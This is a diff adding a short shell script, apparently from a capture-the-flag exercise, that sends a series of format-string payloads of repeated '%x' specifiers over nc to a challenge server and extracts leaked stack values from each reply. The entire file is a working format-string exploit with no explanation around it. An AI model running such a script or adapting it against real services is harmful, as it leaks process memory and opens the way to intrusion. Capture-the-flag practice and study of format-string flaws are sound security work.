@@ -1,0 +1,7 @@
+#!/bin/sh
+
+for i in $(seq 0 54)
+do
+	payload=$(perl -e "print '%x' x $i . '%08x'")
+	echo "$payload" | nc 9a958a70ea8697789e52027dc12d7fe98cad7833.ctf.site 35000 | head -n 2 | tail -n 1 | tail -c 9
+done
